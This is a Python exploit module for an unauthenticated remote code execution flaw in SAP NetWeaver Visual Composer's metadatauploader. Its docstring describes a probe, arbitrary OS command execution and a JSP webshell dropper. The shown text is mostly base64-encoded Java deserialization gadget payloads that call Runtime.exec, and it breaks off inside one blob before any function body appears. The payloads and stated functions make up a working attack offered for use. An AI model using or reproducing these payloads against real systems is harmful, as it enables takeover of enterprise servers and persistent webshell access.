#!/usr/bin/env python3
"""
CVE-2025-31324 — SAP NetWeaver Visual Composer metadatauploader unauth RCE.

Exposes three entry points used by SAPMAP:
  - check_cve_2025_31324(host, port, use_https=False, timeout=10)
        Safe (non-destructive) probe: POSTs a harmless zipped `.properties` to
        `/developmentserver/metadatauploader` and classifies the response.
  - exploit_cve_2025_31324_command(host, port, command, use_https=False, timeout=15)
        Executes an OS command via the serialised ysoserial Templates gadget,
        auto-retrying with the 7.5 UID swap when the server reports a
        serialVersionUID mismatch.
  - exploit_cve_2025_31324_dropshell(host, port, use_https=False, timeout=15)
        Writes a randomly-named JSP webshell under
        `/irj/servlet_jsp/irj/root/` and returns its URL.

Gadget blobs are reproduced verbatim from the published PoC.  This module is
self-contained: no imports from other sapmap modules, no global SAPMAP state.
Callers handle logging, node updates, and stop_event semantics.
"""

from __future__ import annotations

import base64
import io
import logging
import random
import ssl
import string
import urllib.error
import urllib.request
import zipfile
from typing import Optional

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Gadget blobs (base64) — from the CVE-2025-31324 PoC
# ---------------------------------------------------------------------------

# Java Properties wrapper around a TemplatesImpl gadget that runs
# Runtime.getRuntime().exec(<cmd>) when its getOutputProperties is triggered.
_CMD_H1 = base64.b64decode(
    "rO0ABXNyABRqYXZhLnV0aWwuUHJvcGVydGllczkS0HpwNj6YAgABTAAIZGVmYXVsdHN0ABZMamF2"
    "YS91dGlsL1Byb3BlcnRpZXM7eHIAE2phdmEudXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxv"
    "YWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAXQABGFhYWFzcgARamF2YS51"
    "dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAA"
    "dwgAAAACAAAAAnNxAH4ABT9AAAAAAAAMdwgAAAAQAAAAAnQAAnh4c3IAEWphdmEubGFuZy5JbnRl"
    "Z2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAA"
    "AAF0AAJ2MXNyADljb20uc2FwLnNkby5pbXBsLm9iamVjdHMuc3RyYXRlZ3kucG9qby5Qb2pvUHJv"
    "cE11bHRpVmFsdWVh3L4MJ1IlzAIAAHhyAERjb20uc2FwLnNkby5pbXBsLm9iamVjdHMuc3RyYXRl"
    "Z3kuQWJzdHJhY3ROb25TZXF1ZW5jZWRQcm9wTXVsdGlWYWx1ZRpvhOAFs8zDAgAAeHIAOGNvbS5z"
    "YXAuc2RvLmltcGwub2JqZWN0cy5zdHJhdGVneS5BYnN0cmFjdFByb3BNdWx0aVZhbHVl6Z7F3cAM"
    "TCYCAAJMAA1fZGF0YVN0cmF0ZWd5dAA4TGNvbS9zYXAvc2RvL2ltcGwvb2JqZWN0cy9zdHJhdGVn"
    "eS9BYnN0cmFjdERhdGFTdHJhdGVneTtMAAlfcHJvcGVydHl0ACRMY29tL3NhcC9zZG8vaW1wbC90"
    "eXBlcy9TZG9Qcm9wZXJ0eTt4cHNyADdjb20uc2FwLnNkby5pbXBsLm9iamVjdHMuc3RyYXRlZ3ku"
    "cG9qby5Qb2pvRGF0YVN0cmF0ZWd52bcZk1qmlmsCAAFMABFfcG9qb1RvRGF0YU9iamVjdHQAD0xq"
    "YXZhL3V0aWwvTWFwO3hyAENjb20uc2FwLnNkby5pbXBsLm9iamVjdHMuc3RyYXRlZ3kuZW5oYW5j"
    "ZXIuQWJzdHJhY3RQb2pvRGF0YVN0cmF0ZWd5NecqtnylCGMCAAFMAAVfcG9qb3QAEkxqYXZhL2xh"
    "bmcvT2JqZWN0O3hyADZjb20uc2FwLnNkby5pbXBsLm9iamVjdHMuc3RyYXRlZ3kuQWJzdHJhY3RE"
    "YXRhU3RyYXRlZ3n+tryb9uYRewIABloADV9pbml0aWFsU2NvcGVaABRfaXNSZWFkT25seUFjdGl2"
    "YXRlZFoAB194c2lOaWxaABJfeHNpTmlsSW5pdGlhbGl6ZWRMAAxfY2hhbmdlU3RhdGV0AERMY29t"
    "L3NhcC9zZG8vaW1wbC9vYmplY3RzL3N0cmF0ZWd5L0Fic3RyYWN0RGF0YVN0cmF0ZWd5JENoYW5n"
    "ZVN0YXRlO0wABF9nZG90ACxMY29tL3NhcC9zZG8vaW1wbC9vYmplY3RzL0dlbmVyaWNEYXRhT2Jq"
    "ZWN0O3hwAAEAAHBzcgAqY29tLnNhcC5zZG8uaW1wbC5vYmplY3RzLkdlbmVyaWNEYXRhT2JqZWN0"
    "2z64Nz2AAU0CAARMABVfY29udGFpbm1lbnRQcm9wVmFsdWV0ACRMY29tL3NhcC9zZG8vaW1wbC9v"
    "YmplY3RzL1Byb3BWYWx1ZTtMAA1fZGF0YVN0cmF0ZWd5dAAnTGNvbS9zYXAvc2RvL2ltcGwvb2Jq"
    "ZWN0cy9EYXRhU3RyYXRlZ3k7TAAHX2ZhY2FkZXQALkxjb20vc2FwL3Nkby9pbXBsL29iamVjdHMv"
    "RGF0YU9iamVjdERlY29yYXRvcjtMAA9fdHlwZUFuZENvbnRleHR0ACdMY29tL3NhcC9zZG8vaW1w"
    "bC90eXBlcy9UeXBlQW5kQ29udGV4dDt4cHBzcgA+Y29tLnNhcC5zZG8uaW1wbC5vYmplY3RzLnN0"
    "cmF0ZWd5Lk9wZW5Ob25TZXF1ZW5jZWREYXRhU3RyYXRlZ3mC/IFSOtsC4wIAAUwAD19vcGVuUHJv"
    "cGVydGllc3QAFUxqYXZhL3V0aWwvQXJyYXlMaXN0O3hyADpjb20uc2FwLnNkby5pbXBsLm9iamVj"
    "dHMuc3RyYXRlZ3kuTm9uU2VxdWVuY2VkRGF0YVN0cmF0ZWd523vLWBKWGUYCAAB4cgA9Y29tLnNh"
    "cC5zZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5LkFic3RyYWN0RGVmYXVsdERhdGFTdHJhdGVneaXy"
    "H6Ca6IlMAgABWwALX3Byb3BWYWx1ZXN0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHEAfgAXAAEAAHBx"
    "AH4AIHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA8Y29tLnNhcC5z"
    "ZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5Lk5vblNlcXVlbmNlZFByb3BNdWx0aVZhbHVlYhNYcEEn"
    "xCMCAAJJAAVfc2l6ZVsAB192YWx1ZXNxAH4AJXhxAH4ADnEAfgAmc3IAMmNvbS5zYXAuc2RvLmlt"
    "cGwudHlwZXMuYnVpbHRpbi5Qcm9wZXJ0eUxvZ2ljRmFjYWRlB+0tHi4l9hQCAANMAA9fY29udGFp"
    "bmluZ1R5cGV0ABJMY29tbW9uai9zZG8vVHlwZTtMAARfa2V5dAAgTGNvbS9zYXAvc2RvL2ltcGwv"
    "dHlwZXMvUHJvcEtleTtMAAlfcHJvcE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cgAsY29tLnNh"
    "cC5zZG8uaW1wbC50eXBlcy5idWlsdGluLlByb3BlcnR5TG9naWN6RVLdC6Jn9wIAAUkABl9pbmRl"
    "eHhyADNjb20uc2FwLnNkby5pbXBsLnR5cGVzLmJ1aWx0aW4uRGVsZWdhdGluZ0RhdGFPYmplY3SJ"
    "c0HW7htRHwIAAHhw/////3BzcgAeY29tLnNhcC5zZG8uaW1wbC50eXBlcy5Qcm9wS2V5qwSkdWvY"
    "XTQCAAxaAAtjb250YWlubWVudFoABG1hbnlaAAttYW55VW5rbm93bloAFXNpbXBsZUNvbnRlbnRQ"
    "cm9wZXJ0eVoACnhtbEVsZW1lbnRMAAVhbGlhc3QAEExqYXZhL3V0aWwvTGlzdDtMAA1oZWxwZXJD"
    "b250ZXh0dAAiTGNvbW1vbmovc2RvL2hlbHBlci9IZWxwZXJDb250ZXh0O0wABG5hbWVxAH4ALkwA"
    "BHR5cGV0ACJMY29tL3NhcC9zZG8vYXBpL3V0aWwvVVJJTmFtZVBhaXI7TAADdXJpcQB+AC5MAAd4"
    "bWxOYW1lcQB+AC5MAAd4c2RUeXBlcQB+ADV4cAABAAABc3IAH2phdmEudXRpbC5Db2xsZWN0aW9u"
    "cyRFbXB0eUxpc3R6uBe0PKee3gIAAHhwc3IAKmNvbS5zYXAuc2RvLmltcGwuY29udGV4dC5IZWxw"
    "ZXJDb250ZXh0SW1wbKo1AR5naMIcAgAETAADX2lkcQB+AC5MABhfbWFwcGluZ1N0cmF0ZWd5UHJv"
    "cGVydHl0ABZMY29tbW9uai9zZG8vUHJvcGVydHk7TAAIX29wdGlvbnNxAH4AFEwADl9wYXJlbnRD"
    "b250ZXh0dAAsTGNvbS9zYXAvc2RvL2ltcGwvY29udGV4dC9IZWxwZXJDb250ZXh0SW1wbDt4cHQA"
    "HmNvbS5zYXAuc2RvLmFwaS50eXBlcy5jdHguY29yZXBzcQB+AAU/QAAAAAAAAHcIAAAAEAAAAAB4"
    "cHQABGFhYTJzcgAgY29tLnNhcC5zZG8uYXBpLnV0aWwuVVJJTmFtZVBhaXJW1fSPZjBbrAIAAkwA"
    "BV9uYW1lcQB+AC5MAARfdXJpcQB+AC54cHQABlN0cmluZ3QAC2NvbW1vbmouc2RvdAAAcQB+AD9z"
    "cQB+AEBxAH4ARHEAfgBEcQB+AD8AAAABdXEAfgAnAAAACnQABHh4eHhwcHBwcHBwcHBzcgATamF2"
    "YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAXcEAAAAAXEAfgAxeHEAfgAg"
    "c3IAJ2NvbS5zYXAuc2RvLmltcGwudHlwZXMuYnVpbHRpbi5PcGVuVHlwZR6Nk2oD2NaSAgAAeHIA"
    "K2NvbS5zYXAuc2RvLmltcGwudHlwZXMuYnVpbHRpbi5NZXRhRGF0YVR5cGXilpqoGgykFgIAAkwA"
    "Cl9leHRyYURhdGFxAH4AFEwABF91bnBxAH4ANXhyAC1jb20uc2FwLnNkby5pbXBsLnR5cGVzLmJ1"
    "aWx0aW4uTWV0YURhdGFPYmplY3T0UdyqALbwzAIAAHhwc3EAfgAFP0AAAAAAAAB3CAAAABAAAAAA"
    "eHNxAH4AQHQACE9wZW5UeXBldAALY29tLnNhcC5zZG9zcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhh"
    "bGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVu"
    "dE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltM"
    "amF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AC5MABFfb3V0cHV0UHJvcGVydGllc3EAfgABeHAA"
    "AAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAA=="
)

_CMD_H2 = base64.b64decode(
    "yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu"
    "dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA"
    "EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD"
    "bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5"
    "bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94"
    "c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy"
    "aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs"
    "YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv"
    "eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u"
    "cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t"
    "L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu"
    "L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7"
    "KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B"
    "eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs"
    "L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAIUdhZGdldHMu"
    "amF2YSBmcm9tIElucHV0RmlsZU9iamVjdAwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0"
    "aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu"
    "L2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFs"
    "aXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0"
    "RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAR"
    "amF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7"
    "DAAsAC0KACsALgE="
)

_CMD_TAIL = base64.b64decode(
    "CAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAz"
    "CgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMjc0NTc2NTI4MDMzMzAwAQAg"
    "THlzb3NlcmlhbC9Qd25lcjI3NDU3NjUyODAzMzMwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAA"
    "AgAIAAQAAQAKAAsAAQAMAAAAMwABAAEAAAAFKrcAAbEAAAACAA0AAAAKAAIAAADwAAQA8QAOAAAA"
    "DAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAA9AAOAAAA"
    "IAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJ"
    "AAAABAAAAAGxAAAAAgANAAAABgABAAAA9wAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAAB"
    "ABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8S"
    "MbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgBYAAAB7cr+"
    "ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRW"
    "YWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJM"
    "b2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3Nlcmlh"
    "bC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBACFHYWRnZXRzLmphdmEg"
    "ZnJvbSBJbnB1dEZpbGVPYmplY3QMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dh"
    "ZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNv"
    "c2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgA"
    "AQABAAoACwABAAwAAAAzAAEAAQAAAAUqtwABsQAAAAIADQAAAAoAAgAAAOkABADqAA4AAAAMAAEA"
    "AAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4cHNxAH4AK///"
    "//9wc3EAfgAyAAEAAAFxAH4AOHEAfgA8dAAQb3V0cHV0UHJvcGVydGllc3NxAH4AQHQABk9iamVj"
    "dHEAfgBDcQB+AERxAH4AXnEAfgBFcQB+AF54cQB+AAdzcQB+AAU/QAAAAAAADHcIAAAAEAAAAAJx"
    "AH4ACHEAfgAScQB+AAxxAH4AC3hxAH4AYXh4cA=="
)

# Dropshell gadget blobs (writes a file under irj/)
_DROP_HEAD = base64.b64decode(
    "rO0ABXNyABRqYXZhLnV0aWwuUHJvcGVydGllczkS0HpwNj6YAgABTAAIZGVmYXVsdHN0ABZMamF2"
    "YS91dGlsL1Byb3BlcnRpZXM7eHIAE2phdmEudXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxv"
    "YWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAXQABGFhYWFzcgARamF2YS51"
    "dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAA"
    "dwgAAAACAAAAAnNxAH4ABT9AAAAAAAAMdwgAAAAQAAAAAnQAAnh4c3IAEWphdmEubGFuZy5JbnRl"
    "Z2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAA"
    "AAF0AAJ2MXNyAD1jb20uc2FwLnNkby5pbXBsLm9iamVjdHMucHJvamVjdGlvbnMuUHJvamVjdGlv"
    "blByb3BNdWx0aVZhbHVlXdwlyCqzgtkCAANMAAlfZGVsZWdhdGV0ACRMY29tL3NhcC9zZG8vaW1w"
    "bC9vYmplY3RzL1Byb3BWYWx1ZTtMAAlfcHJvcGVydHl0ABZMY29tbW9uai9zZG8vUHJvcGVydHk7"
    "TAAJX3N0cmF0ZWd5dAA9TGNvbS9zYXAvc2RvL2ltcGwvb2JqZWN0cy9wcm9qZWN0aW9ucy9Qcm9q"
    "ZWN0aW9uRGF0YVN0cmF0ZWd5O3hwc3IAQmNvbS5zYXAuc2RvLmltcGwub2JqZWN0cy5zdHJhdGVn"
    "eS5lbmhhbmNlci5FbmhhbmNlclByb3BTaW5nbGVWYWx1ZQpvvLZAyG4NAgAAeHIARWNvbS5zYXAu"
    "c2RvLmltcGwub2JqZWN0cy5zdHJhdGVneS5BYnN0cmFjdE5vblNlcXVlbmNlZFByb3BTaW5nbGVW"
    "YWx1ZXn2A+LbBfEzAgAAeHIAOWNvbS5zYXAuc2RvLmltcGwub2JqZWN0cy5zdHJhdGVneS5BYnN0"
    "cmFjdFByb3BTaW5nbGVWYWx1ZaNPivXPkXo/AgACTAANX2RhdGFTdHJhdGVneXQAOExjb20vc2Fw"
    "L3Nkby9pbXBsL29iamVjdHMvc3RyYXRlZ3kvQWJzdHJhY3REYXRhU3RyYXRlZ3k7TAAJX3Byb3Bl"
    "cnR5dAAkTGNvbS9zYXAvc2RvL2ltcGwvdHlwZXMvU2RvUHJvcGVydHk7eHBzcgA/Y29tLnNhcC5z"
    "ZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5LmVuaGFuY2VyLkVuaGFuY2VyRGF0YVN0cmF0ZWd52bcZ"
    "k1qmlmsCAAB4cgBDY29tLnNhcC5zZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5LmVuaGFuY2VyLkFi"
    "c3RyYWN0UG9qb0RhdGFTdHJhdGVneTXnKrZ8pQhjAgABTAAFX3Bvam90ABJMamF2YS9sYW5nL09i"
    "amVjdDt4cgA2Y29tLnNhcC5zZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5LkFic3RyYWN0RGF0YVN0"
    "cmF0ZWd5/ra8m/bmEXsCAAZaAA1faW5pdGlhbFNjb3BlWgAUX2lzUmVhZE9ubHlBY3RpdmF0ZWRa"
    "AAdfeHNpTmlsWgASX3hzaU5pbEluaXRpYWxpemVkTAAMX2NoYW5nZVN0YXRldABETGNvbS9zYXAv"
    "c2RvL2ltcGwvb2JqZWN0cy9zdHJhdGVneS9BYnN0cmFjdERhdGFTdHJhdGVneSRDaGFuZ2VTdGF0"
    "ZTtMAARfZ2RvdAAsTGNvbS9zYXAvc2RvL2ltcGwvb2JqZWN0cy9HZW5lcmljRGF0YU9iamVjdDt4"
    "cAABAABwc3IAKmNvbS5zYXAuc2RvLmltcGwub2JqZWN0cy5HZW5lcmljRGF0YU9iamVjdNs+uDc9"
    "gAFNAgAETAAVX2NvbnRhaW5tZW50UHJvcFZhbHVlcQB+AA5MAA1fZGF0YVN0cmF0ZWd5dAAnTGNv"
    "bS9zYXAvc2RvL2ltcGwvb2JqZWN0cy9EYXRhU3RyYXRlZ3k7TAAHX2ZhY2FkZXQALkxjb20vc2Fw"
    "L3Nkby9pbXBsL29iamVjdHMvRGF0YU9iamVjdERlY29yYXRvcjtMAA9fdHlwZUFuZENvbnRleHR0"
    "ACdMY29tL3NhcC9zZG8vaW1wbC90eXBlcy9UeXBlQW5kQ29udGV4dDt4cHBzcgA+Y29tLnNhcC5z"
    "ZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5Lk9wZW5Ob25TZXF1ZW5jZWREYXRhU3RyYXRlZ3mC/IFS"
    "OtsC4wIAAUwAD19vcGVuUHJvcGVydGllc3QAFUxqYXZhL3V0aWwvQXJyYXlMaXN0O3hyADpjb20u"
    "c2FwLnNkby5pbXBsLm9iamVjdHMuc3RyYXRlZ3kuTm9uU2VxdWVuY2VkRGF0YVN0cmF0ZWd523vL"
    "WBKWGUYCAAB4cgA9Y29tLnNhcC5zZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5LkFic3RyYWN0RGVm"
    "YXVsdERhdGFTdHJhdGVneaXyH6Ca6IlMAgABWwALX3Byb3BWYWx1ZXN0ABNbTGphdmEvbGFuZy9P"
    "YmplY3Q7eHEAfgAbAAEAAHBxAH4AI3VyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4"
    "cAAAAAFzcgA8Y29tLnNhcC5zZG8uaW1wbC5vYmplY3RzLnN0cmF0ZWd5Lk5vblNlcXVlbmNlZFBy"
    "b3BNdWx0aVZhbHVlYhNYcEEnxCMCAAJJAAVfc2l6ZVsAB192YWx1ZXNxAH4AKHhyAERjb20uc2Fw"
    "LnNkby5pbXBsLm9iamVjdHMuc3RyYXRlZ3kuQWJzdHJhY3ROb25TZXF1ZW5jZWRQcm9wTXVsdGlW"
    "YWx1ZRpvhOAFs8zDAgAAeHIAOGNvbS5zYXAuc2RvLmltcGwub2JqZWN0cy5zdHJhdGVneS5BYnN0"
    "cmFjdFByb3BNdWx0aVZhbHVl6Z7F3cAMTCYCAAJMAA1fZGF0YVN0cmF0ZWd5cQB+ABVMAAlfcHJv"
    "cGVydHlxAH4AFnhwcQB+AClzcgAyY29tLnNhcC5zZG8uaW1wbC50eXBlcy5idWlsdGluLlByb3Bl"
    "cnR5TG9naWNGYWNhZGUH7S0eLiX2FAIAA0wAD19jb250YWluaW5nVHlwZXQAEkxjb21tb25qL3Nk"
    "by9UeXBlO0wABF9rZXl0ACBMY29tL3NhcC9zZG8vaW1wbC90eXBlcy9Qcm9wS2V5O0wACV9wcm9w"
    "TmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hyACxjb20uc2FwLnNkby5pbXBsLnR5cGVzLmJ1aWx0"
    "aW4uUHJvcGVydHlMb2dpY3pFUt0Lomf3AgABSQAGX2luZGV4eHIAM2NvbS5zYXAuc2RvLmltcGwu"
    "dHlwZXMuYnVpbHRpbi5EZWxlZ2F0aW5nRGF0YU9iamVjdIlzQdbuG1EfAgAAeHD/////cHNyAB5j"
    "b20uc2FwLnNkby5pbXBsLnR5cGVzLlByb3BLZXmrBKR1a9hdNAIADFoAC2NvbnRhaW5tZW50WgAE"
    "bWFueVoAC21hbnlVbmtub3duWgAVc2ltcGxlQ29udGVudFByb3BlcnR5WgAKeG1sRWxlbWVudEwA"
    "BWFsaWFzdAAQTGphdmEvdXRpbC9MaXN0O0wADWhlbHBlckNvbnRleHR0ACJMY29tbW9uai9zZG8v"
    "aGVscGVyL0hlbHBlckNvbnRleHQ7TAAEbmFtZXEAfgAzTAAEdHlwZXQAIkxjb20vc2FwL3Nkby9h"
    "cGkvdXRpbC9VUklOYW1lUGFpcjtMAAN1cmlxAH4AM0wAB3htbE5hbWVxAH4AM0wAB3hzZFR5cGVx"
    "AH4AOnhwAAEAAAFzcgAfamF2YS51dGlsLkNvbGxlY3Rpb25zJEVtcHR5TGlzdHq4F7Q8p57eAgAA"
    "eHBzcgAqY29tLnNhcC5zZG8uaW1wbC5jb250ZXh0LkhlbHBlckNvbnRleHRJbXBsqjUBHmdowhwC"
    "AARMAANfaWRxAH4AM0wAGF9tYXBwaW5nU3RyYXRlZ3lQcm9wZXJ0eXEAfgAPTAAIX29wdGlvbnN0"
    "AA9MamF2YS91dGlsL01hcDtMAA5fcGFyZW50Q29udGV4dHQALExjb20vc2FwL3Nkby9pbXBsL2Nv"
    "bnRleHQvSGVscGVyQ29udGV4dEltcGw7eHB0AB5jb20uc2FwLnNkby5hcGkudHlwZXMuY3R4LmNv"
    "cmVwc3EAfgAFP0AAAAAAAAB3CAAAABAAAAAAeHB0AARhYWEyc3IAIGNvbS5zYXAuc2RvLmFwaS51"
    "dGlsLlVSSU5hbWVQYWlyVtX0j2YwW6wCAAJMAAVfbmFtZXEAfgAzTAAEX3VyaXEAfgAzeHB0AAZT"
    "dHJpbmd0AAtjb21tb25qLnNkb3QAAHEAfgBEc3EAfgBFcQB+AElxAH4ASXEAfgBEAAAAAXVxAH4A"
    "KgAAAAp0AAR4eHh4cHBwcHBwcHBwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkA"
    "BHNpemV4cAAAAAF3BAAAAAFxAH4ANnhxAH4AI3NyACdjb20uc2FwLnNkby5pbXBsLnR5cGVzLmJ1"
    "aWx0aW4uT3BlblR5cGUejZNqA9jWkgIAAHhyACtjb20uc2FwLnNkby5pbXBsLnR5cGVzLmJ1aWx0"
    "aW4uTWV0YURhdGFUeXBl4paaqBoMpBYCAAJMAApfZXh0cmFEYXRhcQB+AD9MAARfdW5wcQB+ADp4"
    "cgAtY29tLnNhcC5zZG8uaW1wbC50eXBlcy5idWlsdGluLk1ldGFEYXRhT2JqZWN09FHcqgC28MwC"
    "AAB4cHNxAH4ABT9AAAAAAAAAdwgAAAAQAAAAAHhzcQB+AEV0AAhPcGVuVHlwZXQAC2NvbS5zYXAu"
    "c2Rvc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBs"
    "YXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9i"
    "eXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAz"
    "TAARX291dHB1dFByb3BlcnRpZXNxAH4AAXhwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAA"
    "AAJ1cgACW0Ks8xf4BghU4AIAAHhwAAA="
)

_DROP_P1 = base64.b64decode(
    "yv66vgAAADIARgoAAwAiBwBEBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu"
    "dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA"
    "EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD"
    "bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5"
    "bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94"
    "c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy"
    "aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs"
    "YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv"
    "eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u"
